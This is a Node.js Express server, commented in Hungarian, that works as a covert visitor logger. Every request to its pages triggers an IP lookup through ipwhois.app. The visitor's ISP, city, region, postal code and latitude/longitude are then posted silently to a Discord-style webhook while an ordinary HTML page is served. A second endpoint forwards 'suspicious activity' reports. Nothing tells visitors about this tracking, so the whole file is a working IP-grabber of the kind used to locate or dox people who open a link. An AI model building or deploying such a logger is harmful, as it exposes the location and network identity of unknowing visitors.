require('dotenv').config();

const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 3000;
const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK;
const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;

app.use(express.static('public'));

// ---- IP lekérés minden lehetőséggel ----
function getClientIp(req) {
  if (req.headers['cf-connecting-ip']) {
    return req.headers['cf-connecting-ip'];
  }
  if (req.headers['x-real-ip']) {
    return req.headers['x-real-ip'];
  }
  if (req.headers['x-forwarded-for']) {
    return req.headers['x-forwarded-for'].split(',')[0].trim();
  }
  return (req.socket.remoteAddress || req.connection.remoteAddress || '').replace(/^.*:/, '');
}

// ---- Geo adatok ipwhois.app API-ból, kulcs nélkül! ----
async function getGeo(ip) {
  try {
    const geo = await axios.get(`https://ipwhois.app/json/${ip}`);
    // Ha error vagy success: false, akkor üres objektumot adunk vissza
    if (geo.data.success === false || geo.data.type === 'error') {
      return {};
    }
    return geo.data;
  } catch (e) {
    console.log('ipwhois.app hiba:', e.message);
    return {};
  }
}

// --- Főoldal (/) ---
app.get('/', async (req, res) => {
  const ip = getClientIp(req);
  const geoData = await getGeo(ip);

  axios.post(MAIN_WEBHOOK, {
    username: "Helyszíni Naplózó <3",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: '',
    embeds: [{
      title: 'Új látogató az oldalon!',
      description:
        `**Oldal:** /\n` +
        `**IP-cím:** ${ip}\n` +
        `**Hálózat:** ${geoData.isp || 'Ismeretlen'}\n` +
        `**Város:** ${geoData.city || 'Ismeretlen'}\n` +
        `**Régió:** ${geoData.region || 'Ismeretlen'}\n` +
        `**Ország:** ${geoData.country || 'Ismeretlen'}\n` +
        `**Irányítószám:** ${geoData.zip || 'Ismeretlen'}\n` +
        `**Szélesség:** ${geoData.latitude || 'Ismeretlen'}\n` +
        `**Hosszúság:** ${geoData.longitude || 'Ismeretlen'}`,
      color: 0x800080
    }]
  }).catch(()=>{});

  res.sendFile(path.join(__dirname, 'public/index.html'));
});

// --- Kiterjesztés nélküli route-ok (/kecske, /kecske2, stb.) ---
app.get('/:page', async (req, res, next) => {
  const pageName = req.params.page;
  if (pageName === 'report') return next();

  const filePath = path.join(__dirname, 'public', pageName + '.html');
  if (fs.existsSync(filePath)) {
    const ip = getClientIp(req);
    const geoData = await getGeo(ip);
    axios.post(MAIN_WEBHOOK, {
      username: "Helyszíni Naplózó <3",
      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
      content: '',
      embeds: [{
        title: 'Új látogató az oldalon!',
        description:
          `**Oldal:** /${pageName}\n` +
          `**IP-cím:** ${ip}\n` +
          `**Hálózat:** ${geoData.isp || 'Ismeretlen'}\n` +
          `**Város:** ${geoData.city || 'Ismeretlen'}\n` +
          `**Régió:** ${geoData.region || 'Ismeretlen'}\n` +
          `**Ország:** ${geoData.country || 'Ismeretlen'}\n` +
          `**Irányítószám:** ${geoData.zip || 'Ismeretlen'}\n` +
          `**Szélesség:** ${geoData.latitude || 'Ismeretlen'}\n` +
          `**Hosszúság:** ${geoData.longitude || 'Ismeretlen'}`,
        color: 0x800080
      }]
    }).catch(()=>{});

    res.sendFile(filePath);
  } else {
    next();
  }
});

// --- Gyanús tevékenység reportolása ---
app.post('/report', express.json(), async (req, res) => {
  const ip = getClientIp(req);
  const { reason, page } = req.body;
  const geoData = await getGeo(ip);

  axios.post(ALERT_WEBHOOK, {
    username: "Helyszíni Naplózó <3",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: '',
    embeds: [{
      title: 'Gyanús tevékenység!',
      description:
        `**Oldal:** ${page || 'Ismeretlen'}\n` +
        `**Művelet:** ${reason}\n` +
        `**IP-cím:** ${ip}\n` +
        `**Ország:** ${geoData.country || 'Ismeretlen'}`,
      color: 0x800080
    }]
  }).catch(()=>{});

  res.json({ ok: true });
});

// --- 404 minden másra ---
app.use((req, res) => {
  res.status(404).send('404 Not Found');
});

app.listen(PORT, () => {
  console.log(`Szerver elindult: http://localhost:${PORT}`);
});
